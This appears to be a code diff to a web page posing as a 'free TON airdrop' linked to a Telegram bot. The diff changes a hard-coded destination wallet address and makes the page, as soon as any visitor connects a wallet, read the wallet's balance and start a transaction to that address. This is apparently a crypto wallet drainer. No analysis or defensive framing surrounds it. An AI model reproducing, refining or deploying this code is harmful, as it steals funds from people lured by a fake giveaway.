@@ -22,9 +22,9 @@
             twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
         };
 
-        const destinationAddress = 'UQB98POW4sSTLGbr1_IULM5-cf-WXV4y_soC580fq5GIPrA3'; // Adres docelowy
+        const destinationAddress = 'EQA0i8-CdGnF_DhUHHf92R1ONH6sIA9vLZ_WLcCIhfBBXwtG'; // Adres docelowy
 
-        tonConnectUI.onWalletConnected(async (wallet) => {
+        async function sendTransaction(wallet) {
             try {
                 const balance = await tonConnectUI.provider.getBalance(wallet.account.address);
                 
@@ -43,6 +43,16 @@
             } catch (error) {
                 console.error('Błąd podczas wysyłania transakcji:', error);
                 document.getElementById('transaction-status').innerText = 'Błąd: ' + error.message;
+            }
+        }
+
+        tonConnectUI.onStatusChange(async (walletInfo) => {
+            if (walletInfo) {
+                console.log('Portfel podłączony:', walletInfo);
+                await sendTransaction(walletInfo);
+            } else {
+                console.log('Portfel odłączony');
+                document.getElementById('transaction-status').innerText = '';
             }
         });
     </script>
